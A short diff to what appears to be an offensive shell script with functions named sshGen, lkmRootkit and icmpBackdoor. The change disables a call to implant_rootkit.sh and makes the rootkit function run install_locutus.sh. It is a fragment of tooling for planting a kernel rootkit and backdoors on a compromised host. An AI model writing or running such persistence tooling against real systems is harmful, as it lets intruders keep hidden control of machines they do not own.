@@ -195,8 +195,9 @@ sshGen() {
 }
 
 lkmRootkit() {
-	chmod +x implant_rootkit.sh
-	./implant_rootkit.sh
+	#chmod +x implant_rootkit.sh
+	#./implant_rootkit.sh
+	bash install_locutus.sh
 }
 
 icmpBackdoor() {
